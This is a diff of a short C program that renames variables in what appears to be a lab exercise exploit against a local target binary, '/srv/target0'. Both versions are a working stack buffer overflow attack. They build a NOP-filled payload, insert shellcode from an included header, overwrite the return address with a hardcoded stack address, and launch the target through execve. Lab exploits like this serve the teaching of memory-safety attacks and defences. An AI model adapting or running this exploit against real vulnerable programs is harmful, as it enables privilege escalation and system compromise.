@@ -5,34 +5,34 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* TARGET = "/srv/target0";
+const char* target = "/srv/target0";
 
-const int PAYLOADSIZE = 408;
-const int SHELLCODESIZE = sizeof(shellcode) - 1;
-const uint32_t RETADDR = 0xffffdb2c;
+const int psize = 408;
+const int ssize = sizeof(shellcode) - 1;
+const uint32_t retaddr = 0xffffdb2c;
 
-void prepPayload(char *payload) {
-    memset(payload, 0x90, PAYLOADSIZE);
-    payload[PAYLOADSIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODESIZE);
-    *(uint32_t*)(payload + PAYLOADSIZE - 4) = RETADDR;
+void craft(char *p) {
+    memset(p, 0x90, psize);
+    p[psize] = '\0';
+    memcpy(p, shellcode, ssize);
+    *(uint32_t*)(p + psize - 4) = retaddr;
 }
 
 int main(void)
 {
-    char *args[3];
-    char *env[1];
-    char payload[PAYLOADSIZE + 1];
+    char *a[3];
+    char *e[1];
+    char p[psize + 1];
 
-    prepPayload(payload);
+    craft(p);
 
-    args[0] = TARGET;
-    args[1] = payload;
-    args[2] = NULL;
+    a[0] = target;
+    a[1] = p;
+    a[2] = NULL;
 
-    env[0] = NULL;
+    e[0] = NULL;
 
-    execve(TARGET, args, env);
+    execve(target, a, e);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
